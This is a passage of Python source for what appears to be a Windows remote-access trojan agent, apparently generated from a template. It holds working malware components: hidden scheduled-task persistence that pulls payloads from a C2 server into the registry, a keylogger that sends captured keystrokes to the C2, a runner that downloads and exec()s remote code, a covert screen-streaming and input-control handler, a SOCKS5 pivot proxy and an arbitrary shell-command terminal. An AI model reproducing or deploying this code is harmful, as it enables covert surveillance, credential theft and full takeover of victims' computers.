                '        <Principal id="Author">',
                '            <RunLevel>HighestAvailable</RunLevel>',
                '        </Principal>',
                '    </Principals>',
                '    <Settings>',
                '        <Hidden>true</Hidden>',
                '        <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>',
                '    </Settings>',
                '    <Actions Context="Author">',
                '        <Exec>',
                '            <Command>conhost</Command>',
                f'            <Arguments>--headless cmd /c "{{batch_path}}"</Arguments>',
                '        </Exec>',
                '    </Actions>',
                '</Task>'
            ]
            
            xml_path = os.path.join(os.getenv('TEMP'), 'task_' + str(random.randint(1000,9999)) + '.xml')
            logger.debug(f"Writing task XML to {{xml_path}}")
            
            with open(xml_path, 'w') as f:
                f.write("\n".join(task_xml_lines))
            
            logger.info(f"Creating scheduled task '{{task_name}}'")
            result = subprocess.run(
                ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                logger.info(f"Successfully created task '{{task_name}}'")
            else:
                logger.error(f"Failed to create task. STDOUT: {{result.stdout}} STDERR: {{result.stderr}}")
                return None
            
            return task_name
        except Exception as e:
            logger.error(f"Failed to create scheduled task: {{str(e)}}", exc_info=True)
            return None
        finally:
            try:
                if 'xml_path' in locals() and os.path.exists(xml_path):
                    os.remove(xml_path)
                    logger.debug(f"Cleaned up temporary XML file: {{xml_path}}")
            except Exception as e:
                logger.error(f"Failed to clean up XML file: {{str(e)}}")

    @staticmethod
    def install(c2_server):
        logger = logging.getLogger('agent.persistence.install')
        try:
            logger.info(f"Starting persistence installation with C2: {{c2_server}}")
            
            if platform.system() != "Windows":
                logger.error("Non-Windows platform detected")
                return {{"status": "error", "message": "Only Windows supported"}}
            
            logger.info("Downloading and storing engine (Python package)")
            if not Persistence._download_to_registry(f"{{c2_server}}//a/p", "engine", c2_server):
                logger.error("Failed to store engine in registry")
                return {{"status": "error", "message": "Failed to store engine in registry"}}
            
            logger.info("Downloading and storing lube (Python script)")
            if not Persistence._download_to_registry(f"{{c2_server}}//a/d", "lube", c2_server):
                logger.error("Failed to store lube in registry")
                return {{"status": "error", "message": "Failed to store lube in registry"}}
            
            logger.info("Creating scheduled task")
            task_name = Persistence._create_scheduled_task()
            if not task_name:
                logger.error("Failed to create scheduled task")
                return {{"status": "error", "message": "Failed to create scheduled task"}}
            
            success_msg = "Persistence installed successfully"
            logger.info(success_msg)
            return {{
                "status": "success", 
                "message": success_msg,
                "registry_entries": ["engine", "lube"],
                "task_name": task_name,
                "extraction_path": r"%PUBLIC%\documents",
                "execution_method": "python_from_registry"
            }}
            
        except Exception as e:
            logger.error(f"Installation failed: {{str(e)}}", exc_info=True)
            return {{"status": "error", "message": str(e)}}
        



# ======================
# SOCKS5 Proxy
# ======================
class SOCKS5Proxy:
    def __init__(self, port):
        self.port = port
        self.running = False
        self.server_socket = None
        self.connections = {{}}

    def start(self):
        if self.running:
            return {{"status": "error", "message": "Proxy already running"}}
        
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('127.0.0.1', self.port))
            self.server_socket.listen(5)
            self.running = True
            
            threading.Thread(target=self._accept_connections, daemon=True).start()
            return {{"status": "success", "message": f"SOCKS5 proxy started on port {{self.port}}"}}
        except Exception as e:
            return {{"status": "error", "message": str(e)}}

    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        return {{"status": "success", "message": "SOCKS5 proxy stopped"}}

    def _accept_connections(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(conn, addr),
                    daemon=True
                ).start()
            except:
                break

    def _handle_client(self, conn, addr):
        try:
            conn.recv(256)
            conn.sendall(b"\x05\x00")
            
            request = conn.recv(4)
            if request[0] != 0x05 or request[1] != 0x01:
                conn.close()
                return
            
            addr_type = request[3]
            if addr_type == 0x01:
                target_host = socket.inet_ntoa(conn.recv(4))
            elif addr_type == 0x03:
                length = ord(conn.recv(1))
                target_host = conn.recv(length).decode()
            else:
                conn.close()
                return
            
            target_port = int.from_bytes(conn.recv(2), 'big')
            
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((target_host, target_port))
            
            conn.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (self.port).to_bytes(2, 'big'))
            
            self._relay_data(conn, target_sock)
        except Exception as e:
            pass
        finally:
            conn.close()

    def _relay_data(self, client_sock, target_sock):
        sockets = [client_sock, target_sock]
        while self.running:
            try:
                read_sockets, _, _ = select.select(sockets, [], [], 1)
                for sock in read_sockets:
                    data = sock.recv(4096)
                    if not data:
                        return
                    
                    if sock == client_sock:
                        target_sock.sendall(data)
                    else:
                        client_sock.sendall(data)
            except:
                break

# ======================
# Keylogger
# ======================

# Global process registry to track all running subprocesses across all connections
# This allows us to kill all processes when needed to prevent blocking
GLOBAL_PROCESS_REGISTRY = {{}}
GLOBAL_PROCESS_REGISTRY_LOCK = threading.Lock()

def _register_process(process_id, proc, command):
    """Register a process in the global registry"""
    with GLOBAL_PROCESS_REGISTRY_LOCK:
        GLOBAL_PROCESS_REGISTRY[process_id] = {{
            'process': proc,
            'command': command,
            'start_time': time.time()
        }}

def _unregister_process(process_id):
    """Remove a process from the global registry"""
    with GLOBAL_PROCESS_REGISTRY_LOCK:
        if process_id in GLOBAL_PROCESS_REGISTRY:
            del GLOBAL_PROCESS_REGISTRY[process_id]

def _kill_all_processes():
    """Kill all registered processes - used for cleanup"""
    with GLOBAL_PROCESS_REGISTRY_LOCK:
        for process_id, proc_info in list(GLOBAL_PROCESS_REGISTRY.items()):
            try:
                proc = proc_info.get('process')
                if proc:
                    proc.kill()
                    try:
                        proc.wait(timeout=1)
                    except:
                        pass
            except Exception:
                pass
        GLOBAL_PROCESS_REGISTRY.clear()

def _force_kill_process(process_id):
    """Force kill a specific process by ID"""
    with GLOBAL_PROCESS_REGISTRY_LOCK:
        if process_id in GLOBAL_PROCESS_REGISTRY:
            proc_info = GLOBAL_PROCESS_REGISTRY[process_id]
            try:
                proc = proc_info.get('process')
                if proc:
                    proc.kill()
                    try:
                        proc.wait(timeout=1)
                    except:
                        pass
            except Exception:
                pass
            del GLOBAL_PROCESS_REGISTRY[process_id]

import threading

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.running = threading.Event()
        self.ws_client = None
        self.lock = threading.Lock()
        self.batch_size = 50
        self.batch_interval = 5  # seconds
        self._last_send_time = 0
        self.logger = logging.getLogger('keylogger')
        if not self.logger.hasHandlers():
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            self.logger.addHandler(handler)
            self.logger.setLevel(logging.DEBUG)

    def start(self):
        if self.running.is_set():
            self.logger.debug("Keylogger start called but already running")
            return {{"status": "error", "message": "Keylogger already running"}}
        
        self.logger.debug("Keylogger start called")
        self.running.set()
        self.log = ""
        self._last_send_time = time.time()
        self.listener = keyboard.Listener(on_press=self._on_key_press)
        self.listener.start()
        self.logger.debug("Keylogger started and listener started")
        self._start_sending_thread()
        return {{"status": "success", "message": "Keylogger started"}}

    def _start_sending_thread(self):
        def send_loop():
            self.logger.debug("Keylogger sending thread started")
            while self.running.is_set():
                time.sleep(self.batch_interval)
                self._send_logs()
        threading.Thread(target=send_loop, daemon=True).start()

    def _on_key_press(self, key):
        if not self.running.is_set():
            self.logger.debug("Keylogger received key press but not running, ignoring")
            return
        self.logger.debug(f"Key pressed: {{key}}")
        try:
            char = str(key.char)
        except AttributeError:
            if key == key.space:
                char = " "
            elif key == key.enter:
                char = "\n"
            else:
                char = f"[{{key}}]"
        with self.lock:
            self.log += char
        if len(self.log) >= self.batch_size or (time.time() - self._last_send_time) >= self.batch_interval:
            self._send_logs()

    def _send_logs(self):
        if not self.ws_client or not self.running.is_set():
            self.logger.debug("Keylogger _send_logs: ws_client missing or not running")
            return
        with self.lock:
            if not self.log:
                self.logger.debug("Keylogger _send_logs: no logs to send")
                return
            data_to_send = self.log
            self.log = ""
            self._last_send_time = time.time()
        try:
            self.logger.debug(f"Keylogger _send_logs: sending {{len(data_to_send)}} chars")
            if self.ws_client and self.ws_client.socket:
                self.logger.debug(f"Emitting keylogger_data event with data: agent_id={{self.ws_client.agent_id}}, keys_length={{len(data_to_send)}}")
                self.ws_client.socket.emit('keylogger_data', {{
                    'agent_id': self.ws_client.agent_id,
                    'keys': data_to_send,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
                }}, namespace='/keylogger')
                self.logger.debug("Keylogger _send_logs: sent successfully")
            else:
                self.logger.debug("Keylogger _send_logs: ws_client or socket not available")
        except Exception as e:
            self.logger.error(f"Failed to send keylogger data: {{str(e)}}")

    def stop(self):
        if not self.running.is_set():
            self.logger.debug("Keylogger stop called but not running")
            return {{"status": "error", "message": "Keylogger not running"}}
        
        self.logger.debug("Keylogger stop called")
        self.running.clear()
        if self.listener:
            self.listener.stop()
            self.logger.debug("Keylogger listener stopped")
            self.listener.join()
            self.logger.debug("Keylogger listener thread joined")
            self.listener = None
        else:
            self.logger.debug("Keylogger listener was None")
        self._send_logs()
        self.logger.debug("Keylogger stopped")
        return {{"status": "success", "message": "Keylogger stopped"}}

    def get_logs(self):
        with self.lock:
            logs = self.log
            self.log = ""
        return logs


# ======================
# Shellcode-Runner
# ======================
if platform.system() == 'Windows':
    class ShellcodeRunner:
        @staticmethod
        def execute_runner(runner_url):
            """Execute the runner script in one line and capture output"""
            try:
                # Create the one-liner command
                cmd = [
                    sys.executable,
                    "-c",
                    f"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);"
                    f"import requests;url='{{runner_url}}';exec(requests.get(url,verify=False).text)"
                ]
                
                # Run synchronously and capture output
                result = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=60,
                    shell=True
                )
                
                return {{
                    'status': 'success',
                    'message': 'Runner script executed',
                    'stdout': result.stdout,
                    'stderr': result.stderr,
                    'returncode': result.returncode
                }}
            except Exception as e:
                return {{
                    'status': 'error',
                    'message': str(e)
                }}
            


# ======================
# Remote Desktop Handler (FIXED VERSION)
# ======================
class RemoteDesktopHandler:
    def __init__(self, agent_id, crypto, server_url, config):
        self.agent_id = agent_id
        self.crypto = crypto
        self.config = config
        self.server_url = server_url
        self.socket = None
        self.connected = False
        self.screenshot_thread = None
        self.screenshot_running = False
        self.quality = 'medium'
        self.screenshot_interval = 0.5  # Faster updates: 2 FPS instead of 1 FPS
        self.last_screenshot_hash = None
        self.skip_identical_frames = True
        self._setup_logger()

    def _setup_logger(self):
        self.logger = logging.getLogger('remote_desktop')
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(handler)

    def connect(self):
        try:
            self.logger.info(f"Connecting to Remote Desktop WebSocket at {{self.server_url}}")
            self.socket = socketio.Client(
                ssl_verify=False,
                reconnection=True,
                reconnection_attempts=5,  # Limited reconnection attempts
                reconnection_delay=2000,
                logger=False,  # Disable verbose logging
                engineio_logger=False
            )

            @self.socket.on('connect', namespace='/remote_desktop')
            def on_connect():
                self.logger.info("Remote Desktop WebSocket connected")
                try:
                    auth_data = {{
                        'agent_id': self.agent_id,
                        'auth_token': self.crypto.encrypt({{
                            'agent_id': self.agent_id,
                            'timestamp': int(time.time())
                        }})
                    }}
                    self.socket.emit('agent_connect', auth_data, namespace='/remote_desktop')
                    self.connected = True
                    
                    # Send screen information immediately after connection (FIXED)
                    try:
                        screen_width, screen_height = pyautogui.size()
                        self.socket.emit('screen_info', {{
                            'agent_id': self.agent_id,
                            'width': screen_width,
                            'height': screen_height,
                            'scale_x': SCALE_X,
                            'scale_y': SCALE_Y
                        }}, namespace='/remote_desktop')
                        
                        self.socket.emit('scale_factors', {{
                            'agent_id': self.agent_id,
                            'scale_x': SCALE_X,
                            'scale_y': SCALE_Y
                        }}, namespace='/remote_desktop')
                        self.logger.info("Screen info sent to remote desktop")
                    except Exception as screen_error:
                        self.logger.error(f"Failed to send screen info: {{str(screen_error)}}")
                    
                    self.start_screenshot_stream()
                    self.logger.info("Remote Desktop authentication sent and streaming started")
                except Exception as auth_error:
                    self.logger.error(f"Failed to authenticate: {{str(auth_error)}}")
                    self.disconnect()

            @self.socket.on('disconnect', namespace='/remote_desktop')
            def on_disconnect():
                self.logger.warning("Remote Desktop WebSocket disconnected")
                self.connected = False
                self.stop_screenshot_stream()

            @self.socket.on('connect_error', namespace='/remote_desktop')
            def on_connect_error(data):
                self.logger.error(f"Remote Desktop connection error: {{data}}")
                self.connected = False
                self.stop_screenshot_stream()

            @self.socket.on('change_quality', namespace='/remote_desktop')
            def on_change_quality(data):
                self.quality = data.get('quality', 'medium')
                # Reset screenshot hash when quality changes to force update
                self.last_screenshot_hash = None
                self.logger.info(f"Quality changed to: {{self.quality}}")

            @self.socket.on('stop_screenshots', namespace='/remote_desktop')
            def on_stop_screenshots(data):
                self.logger.info("Stopping screenshot stream")
                self.stop_screenshot_stream()
                self.connected = False

            @self.socket.on('ping', namespace='/remote_desktop')
            def on_ping(data):
                # Respond to ping to keep connection alive
                try:
                    self.socket.emit('pong', {{'timestamp': int(time.time())}}, namespace='/remote_desktop')
                except:
                    pass

            @self.socket.on('mouse_move', namespace='/remote_desktop')
            def on_mouse_move(data):
                try:
                    x = data.get('x')
                    y = data.get('y')
                    if x is not None and y is not None:
                        # Frontend sends coordinates in screenshot resolution
                        # These coordinates should match pyautogui.size() exactly
                        x_screen = float(x)
                        y_screen = float(y)
                        
                        # Get actual screen size
                        screen_width, screen_height = pyautogui.size()
                        
                        # Clamp coordinates to screen bounds
                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
                        
                        # Move mouse directly - no scaling needed
                        pyautogui.moveTo(x_screen, y_screen)
                        self.logger.debug(f"Mouse moved to ({{x_screen}}, {{y_screen}}) [screen: {{screen_width}}x{{screen_height}}]")
                except Exception as e:
                    self.logger.error(f"Mouse move failed: {{str(e)}}")

            @self.socket.on('mouse_click', namespace='/remote_desktop')
            def on_mouse_click(data):
                try:
                    x = data.get('x')
                    y = data.get('y')
                    button = data.get('button', 'left')
                    if x is not None and y is not None:
                        # Frontend sends coordinates in screenshot resolution
                        x_screen = float(x)
                        y_screen = float(y)
                        
                        # Get actual screen size
                        screen_width, screen_height = pyautogui.size()
                        
                        # Clamp coordinates to screen bounds
                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
                        
                        # Click directly - no scaling needed
                        pyautogui.click(x_screen, y_screen, button=button)
                        self.logger.debug(f"Mouse clicked at ({{x_screen}}, {{y_screen}}) with {{button}} button [screen: {{screen_width}}x{{screen_height}}]")
                except Exception as e:
                    self.logger.error(f"Mouse click failed: {{str(e)}}")

            @self.socket.on('mouse_scroll', namespace='/remote_desktop')
            def on_mouse_scroll(data):
                try:
                    x = data.get('x')
                    y = data.get('y')
                    direction = data.get('direction', 'down')
                    if x is not None and y is not None:
                        # Frontend sends coordinates in screenshot resolution
                        x_screen = float(x)
                        y_screen = float(y)
                        
                        # Get actual screen size
                        screen_width, screen_height = pyautogui.size()
                        
                        # Clamp coordinates to screen bounds
                        x_screen = int(max(0, min(x_screen, screen_width - 1)))
                        y_screen = int(max(0, min(y_screen, screen_height - 1)))
                        
                        # Move mouse to position first
                        pyautogui.moveTo(x_screen, y_screen)
                        
                        # Scroll: positive for up, negative for down
                        clicks = 3 if direction == 'down' else -3
                        pyautogui.scroll(clicks, x_screen, y_screen)
                        self.logger.debug(f"Mouse scrolled {{direction}} at ({{x_screen}}, {{y_screen}}) [screen: {{screen_width}}x{{screen_height}}]")
                except Exception as e:
                    self.logger.error(f"Mouse scroll failed: {{str(e)}}")

            @self.socket.on('keyboard_press', namespace='/remote_desktop')
            def on_keyboard_press(data):
                try:
                    key = data.get('key')
                    if key:
                        # Handle special keys
                        if key == 'Enter':
                            pyautogui.press('enter')
                        elif key == 'Backspace':
                            pyautogui.press('backspace')
                        elif key == 'Tab':
                            pyautogui.press('tab')
                        elif key == 'Escape':
                            pyautogui.press('esc')
                        elif key == ' ':
                            pyautogui.press('space')
                        elif key == 'ArrowUp':
                            pyautogui.press('up')
                        elif key == 'ArrowDown':
                            pyautogui.press('down')
                        elif key == 'ArrowLeft':
                            pyautogui.press('left')
                        elif key == 'ArrowRight':
                            pyautogui.press('right')
                        elif key == 'Shift':
                            pyautogui.keyDown('shift')
                        elif key == 'Control':
                            pyautogui.keyDown('ctrl')
                        elif key == 'Alt':
                            pyautogui.keyDown('alt')
                        elif len(key) == 1:
                            # Regular character
                            pyautogui.press(key)
                        else:
                            # Try to handle as special key
                            try:
                                pyautogui.press(key.lower())
                            except:
                                self.logger.warning(f"Unknown key: {{key}}")
                        self.logger.debug(f"Key pressed: {{key}}")
                except Exception as e:
                    self.logger.error(f"Keyboard press failed: {{str(e)}}")

            @self.socket.on('keyboard_release', namespace='/remote_desktop')
            def on_keyboard_release(data):
                try:
                    key = data.get('key')
                    if key:
                        # Handle key releases for modifiers
                        if key == 'Shift':
                            pyautogui.keyUp('shift')
                        elif key == 'Control':
                            pyautogui.keyUp('ctrl')
                        elif key == 'Alt':
                            pyautogui.keyUp('alt')
                        # For other keys, release is handled automatically
                        self.logger.debug(f"Key released: {{key}}")
                except Exception as e:
                    self.logger.error(f"Keyboard release failed: {{str(e)}}")

            # Parse server_url to separate base URL and socket.io path
            from urllib.parse import urlparse
            parsed_url = urlparse(self.server_url)
            if parsed_url.path and parsed_url.path != '/':
                # If there's a path, include it in base_url and use default socketio_path
                base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}{{parsed_url.path}}"
                socketio_path = '/socket.io'
            else:
                # No path, use default
                base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}"
                socketio_path = '/socket.io'

            self.logger.info(f"Connecting to base_url: {{base_url}}, socketio_path: {{socketio_path}}")

            self.socket.connect(
                base_url,
                socketio_path=socketio_path,
                headers={{
                    'User-Agent': self.config.USER_AGENT,
                    'X-Agent-ID': self.agent_id
                }},
                namespaces=['/remote_desktop'],
                transports=['websocket', 'polling']  # Allow fallback to polling
            )

            return True
        except Exception as e:
            self.logger.error(f"Remote Desktop connection failed: {{str(e)}}")
            return False

    def start_screenshot_stream(self):
        if self.screenshot_running:
            return

        self.screenshot_running = True
        self.screenshot_thread = threading.Thread(target=self._screenshot_loop, daemon=True)
        self.screenshot_thread.start()
        self.logger.info("Screenshot stream started")

    def stop_screenshot_stream(self):
        if not self.screenshot_running:
            return
        self.screenshot_running = False
        if self.screenshot_thread and self.screenshot_thread.is_alive():
            self.screenshot_thread.join(timeout=2)  # Increased timeout
            if self.screenshot_thread and self.screenshot_thread.is_alive():
                self.logger.warning("Screenshot thread did not stop gracefully")
            self.screenshot_thread = None
        self.logger.info("Screenshot stream stopped")

    def _screenshot_loop(self):
        consecutive_errors = 0
        max_consecutive_errors = 5
        
        while self.screenshot_running and self.connected:
            try:
                screenshot_data = self._take_screenshot()
                if screenshot_data and self.socket and self.connected:
                    # Skip identical frames if enabled
                    if self.skip_identical_frames:
                        current_hash = hash(screenshot_data)
                        if current_hash == self.last_screenshot_hash:
                            time.sleep(self.screenshot_interval)
                            continue
                        self.last_screenshot_hash = current_hash

                    # Check if socket is still connected before emitting
                    if self.socket and self.socket.connected:
                        try:
                            self.socket.emit('screenshot_update', {{
                                'agent_id': self.agent_id,
                                'screenshot': screenshot_data
                            }}, namespace='/remote_desktop')
                            consecutive_errors = 0  # Reset error counter on success
                        except Exception as emit_error:
                            consecutive_errors += 1
                            self.logger.warning(f"Screenshot emit failed ({{consecutive_errors}}/5): {{str(emit_error)}}")
                            if consecutive_errors >= max_consecutive_errors:
                                self.logger.error("Too many consecutive errors, stopping screenshot loop")
                                break
                    else:
                        self.logger.warning("Socket not connected, stopping screenshot loop")
                        break
                time.sleep(self.screenshot_interval)
            except Exception as e:
                consecutive_errors += 1
                self.logger.error(f"Screenshot loop error ({{consecutive_errors}}/5): {{str(e)}}")
                if consecutive_errors >= max_consecutive_errors:
                    self.logger.error("Too many consecutive errors, stopping screenshot loop")
                    break
                time.sleep(self.screenshot_interval)

    def _take_screenshot(self):
        """Take screenshot using optimized MSS for better performance"""
        try:
            # Use MSS directly for better performance
            import mss
            import mss.tools

            with mss.mss() as sct:
                monitor = sct.monitors[0]  # Primary monitor
                screenshot = sct.grab(monitor)

                # Apply quality settings to raw pixels for better performance
                if self.quality == 'low':
                    # Convert to PIL Image and resize to 50%
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    new_width = int(img.width * 0.5)
                    new_height = int(img.height * 0.5)
                    img = img.resize((new_width, new_height), Image.LANCZOS)
                    buffered = io.BytesIO()
                    img.save(buffered, format="JPEG", quality=60, optimize=True)
                    buffered.seek(0)
                    return base64.b64encode(buffered.read()).decode('utf-8')
                elif self.quality == 'high':
                    # Convert directly to PNG for high quality (better compression than JPEG for screenshots)
                    png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                    return base64.b64encode(png_bytes).decode('utf-8')
                else:  # medium
                    # Convert to PIL Image and resize to 75%
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    new_width = int(img.width * 0.75)
                    new_height = int(img.height * 0.75)
                    img = img.resize((new_width, new_height), Image.LANCZOS)
                    buffered = io.BytesIO()
                    img.save(buffered, format="JPEG", quality=70, optimize=True)
                    buffered.seek(0)
                    return base64.b64encode(buffered.read()).decode('utf-8')

        except ImportError:
            # Fallback to pyautogui if MSS not available
            self.logger.warning("MSS not available, falling back to pyautogui")
            try:
                screenshot = pyautogui.screenshot()

                # Apply quality settings
                if self.quality == 'low':
                    new_width = int(screenshot.width * 0.5)
                    new_height = int(screenshot.height * 0.5)
                    screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
                    buffered = io.BytesIO()
                    screenshot.save(buffered, format="JPEG", quality=60, optimize=True)
                elif self.quality == 'high':
                    buffered = io.BytesIO()
                    screenshot.save(buffered, format="PNG", optimize=True)
                else:  # medium
                    new_width = int(screenshot.width * 0.75)
                    new_height = int(screenshot.height * 0.75)
                    screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
                    buffered = io.BytesIO()
                    screenshot.save(buffered, format="JPEG", quality=70, optimize=True)

                buffered.seek(0)
                return base64.b64encode(buffered.read()).decode('utf-8')

            except Exception as e:
                self.logger.error(f"PyAutoGUI screenshot failed: {{str(e)}}")
                return None
        except Exception as e:
            self.logger.error(f"Unexpected error during screenshot capture: {{str(e)}}")
            return None

    def disconnect(self):
        self.stop_screenshot_stream()
        if self.socket:
            try:
                self.socket.disconnect()
                self.socket = None
            except Exception as e:
                self.logger.error(f"Disconnect error: {{str(e)}}")
        self.connected = False

# ======================
# WebSocket Client
# ======================
class WebSocketClient:
    def __init__(self, agent_id, crypto, server_url, config, namespace):
        self.agent_id = agent_id
        self.crypto = crypto
        self.config = config
        self.namespace = namespace
        self.server_url = server_url
        self.socket = None
        self.connected = False
        self.current_dir = os.getcwd()
        self.keep_alive_running = False
        self._setup_logger()
        self._connection_timeout = 10  # seconds
        self.running_processes = {{}}  # Track running subprocesses for async execution

    def _setup_logger(self):
        self.logger = logging.getLogger('websocket')
        self.logger = logging.getLogger('agent')
        self.logger.setLevel(logging.DEBUG)
        handler = logging.StreamHandler()
        handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(handler)

    def _setup_event_handlers(self):
        """Setup all WebSocket event handlers"""
        if self.namespace == '/terminal':
            @self.socket.on('execute_command', namespace='/terminal')
            def on_command(data):
                try:
                    self.logger.info(f"Executing command: {{data.get('command')}}")
                    
                    # Execute the command and get results
                    result = self._execute_command(data.get('command', ''))
                    
                    # Format the response properly
                    response = {{
                        'agent_id': self.agent_id,
                        'command': data.get('command', ''),
                        'output': result.get('output', ''),
                        'error': result.get('error', ''),
                        'current_dir': result.get('current_dir', '')
                    }}
                    
                    self.logger.debug(f"Sending command result: {{response}}")
                    self.socket.emit('command_result', response, namespace='/terminal')

                except Exception as e:
                    self.logger.error(f"Command handling failed: {{str(e)}}")
                    self.socket.emit('command_result', {{
                        'agent_id': self.agent_id,
                        'error': f"Command processing error: {{str(e)}}",
                        'current_dir': self.current_dir
                    }}, namespace='/terminal')

            @self.socket.on('get_current_dir', namespace='/terminal')
            def on_get_current_dir(data):
                self.socket.emit('command_result', {{
                    'agent_id': self.agent_id,
                    'command': '',
                    'output': '',
                    'error': '',
                    'current_dir': self.current_dir
                }}, namespace='/terminal')

            @self.socket.on('kill_process', namespace='/terminal')
            def on_kill_process(data):
                """Kill a running process by ID"""
                process_id = data.get('process_id')
                
                # Handle killing all processes
                if process_id == 'ALL':
                    self._log_info("[SocketIO] Killing all running processes")
                    _kill_all_processes()
                    self.running_processes.clear()
                    self.socket.emit('command_result', {{
                        'agent_id': self.agent_id,
                        'output': '',
                        'error': 'All processes killed',
                        'current_dir': self.current_dir
                    }}, namespace='/terminal')
                    return
                
                if process_id and process_id in self.running_processes:
                    try:
                        proc_info = self.running_processes[process_id]
                        proc_info['process'].kill()
                        del self.running_processes[process_id]
                        self.socket.emit('command_result', {{
                            'agent_id': self.agent_id,
                            'output': '',
                            'error': f"Process {{process_id}} killed",
                            'current_dir': self.current_dir
                        }}, namespace='/terminal')
                    except Exception as e:
                        self.logger.error(f"Failed to kill process: {{str(e)}}")
                else:
                    self.socket.emit('command_result', {{
                        'agent_id': self.agent_id,
                        'output': '',
                        'error': f"Process {{process_id}} not found",
                        'current_dir': self.current_dir
                    }}, namespace='/terminal')

            @self.socket.on('list_processes', namespace='/terminal')
            def on_list_processes(data):
                """List all running processes"""
                process_list = []
                for pid, info in self.running_processes.items():
                    process_list.append({{
                        'id': pid,
                        'command': info['command'],
                        'start_time': info['start_time']
                    }})
                self.socket.emit('process_list', {{'processes': process_list}}, namespace='/terminal')
            
            @self.socket.on('force_kill', namespace='/terminal')
            def on_force_kill(data):
                self._log_info("[!] Received forced kill command")
                self._immediate_self_destruct()

            @self.socket.on('stop_keep_alive', namespace='/terminal')
            def on_stop_keep_alive(data):
                self._log_info("[!] Received stop keep-alive command")
                # Stop the keep-alive thread
                self.keep_alive_running = False

    def connect(self):
        try:
            self.logger.info(f"Connecting to WebSocket at {{self.server_url}} namespace {{self.namespace}}")
            
            self.socket = socketio.Client(
                ssl_verify=False,
                reconnection=True,
                reconnection_attempts=0,  # Unlimited reconnection attempts
                reconnection_delay=3000,
                logger=True,
                engineio_logger=True
            )

            self._setup_event_handlers()
            # Add connection verification timeout
            connection_timeout = 10  # seconds
            connected_event = threading.Event()

            @self.socket.on('connect', namespace=self.namespace)
            def on_connect():
                self.logger.info(f"WebSocket connected on {{self.namespace}}, authenticating...")
                try:
                    auth_data = {{
                        'agent_id': self.agent_id,
                        'auth_token': self.crypto.encrypt({{
                            'agent_id': self.agent_id,
                            'timestamp': int(time.time())
                        }})
                    }}
                    self.socket.emit('agent_connect', auth_data, namespace=self.namespace)
                    self.connected = True
                    connected_event.set()
                except Exception as e:
                    self.logger.error(f"Authentication failed: {{str(e)}}")

            @self.socket.on('disconnect', namespace=self.namespace)
            def on_disconnect():
                self.logger.warning(f"WebSocket disconnected from {{self.namespace}}")
                self.connected = False

            # Start keep-alive ping thread
            def keep_alive_loop():
                while self.connected:
                    try:
                        self.socket.emit('keep_alive', {{'agent_id': self.agent_id}}, namespace=self.namespace)
                        self.logger.debug("Sent keep_alive ping")
                    except Exception as e:
                        self.logger.error(f"Failed to send keep_alive ping: {{str(e)}}")
                    time.sleep(25)
            threading.Thread(target=keep_alive_loop, daemon=True).start()

            # Connect with timeout
            # Parse server_url to separate base URL and socket.io path
            from urllib.parse import urlparse
            parsed_url = urlparse(self.server_url)
            base_url = f"{{parsed_url.scheme}}://{{parsed_url.netloc}}"
            socketio_path = f"{{parsed_url.path}}/socket.io" if parsed_url.path and parsed_url.path != '/' else '/socket.io'

            self.socket.connect(
                base_url,
                socketio_path=socketio_path,
                headers={{
                    'User-Agent': self.config.USER_AGENT,
                    'X-Agent-ID': self.agent_id
                }},
                namespaces=[self.namespace]
            )

            if not connected_event.wait(connection_timeout):
                self.logger.error("WebSocket connection timed out")
                return False
            
            self.logger.info("WebSocket connection established successfully")
            return True

        except Exception as e:
            self.logger.error(f"WebSocket connection failed: {{str(e)}}")
        return False

    def _execute_command(self, command):
        try:
            self.logger.info(f"Executing: {{command}}")
            
            # Handle CD command separately
            if command.lower().startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    if new_dir:
                        os.chdir(new_dir)
                    self.current_dir = os.getcwd()
                    return {{
                        'output': f"Current directory is now: {{self.current_dir}}",
                        'current_dir': self.current_dir
                    }}
                except Exception as e:
                    return {{
                        'error': str(e),
                        'current_dir': self.current_dir
                    }}

            # Execute regular commands asynchronously using Popen
            # This allows multiple commands to run in parallel without blocking
            process_id = str(random.randint(10000, 99999))  # Unique ID for this command
            
            # Start the process
            proc = subprocess.Popen(
                command,
                shell=True,
                cwd=self.current_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
# Store the process for tracking
            self.running_processes[process_id] = {{
                'process': proc,
                'command': command,
                'start_time': time.time()
            }}
            
